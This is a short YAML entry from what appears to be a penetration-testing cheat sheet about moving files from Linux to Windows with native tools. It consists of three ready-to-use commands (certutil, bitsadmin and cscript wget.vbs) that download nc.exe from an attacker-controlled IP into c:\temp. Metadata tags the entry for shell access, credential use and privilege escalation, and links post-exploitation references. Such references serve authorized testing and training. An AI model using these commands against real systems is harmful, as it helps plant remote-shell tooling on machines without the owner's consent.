---
title: |
  File Transfers - Linux to Windows - Native commands
description: |
  Native Commands:

  	certutil.exe -urlcache -split -f "http://10.10.14.17/nc.exe" c:\temp\nc.exe

  	bitsadmin /transfer job /download /priority high http://10.10.14.17/nc.exe c:\temp\nc.exe

  	cscript /nologo wget.vbs http://10.10.14.17/nc.exe nc.exe

command: |
  See commands. 
items:
  - Shell
  - Username
  - Password
OS:
  - Windows
attack_types:
  - Enumeration
  - PrivEsc
references:
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
  - https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/
---
